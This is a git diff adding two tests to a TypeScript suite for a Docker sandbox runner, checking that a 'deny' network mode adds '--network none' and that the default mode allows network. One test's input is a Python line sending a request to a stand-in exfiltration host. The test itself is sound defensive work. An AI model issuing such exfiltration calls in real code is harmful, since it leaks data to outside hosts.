@@ -143,4 +143,19 @@ describe("docker executeSandbox", () => {
     const sleepIdx = create.indexOf("sleep");
     expect(create[sleepIdx + 1]).toBe("infinity");
   });
+
+  it('network "deny" forces --network none even for remote-IO code (MCP M4)', async () => {
+    await executeSandbox("a\n1\n", "import requests\nrequests.get('https://exfil.example/x')", {
+      network: "deny",
+    });
+    const create = createCall();
+    expect(create).toContain("--network");
+    expect(create[create.indexOf("--network") + 1]).toBe("none");
+  });
+
+  it('network "auto" (default) still grants network to remote-IO code', async () => {
+    await executeSandbox("a\n1\n", "duckdb.sql(\"select * from 's3://bucket/x.parquet'\")");
+    const create = createCall();
+    expect(create).not.toContain("--network");
+  });
 });
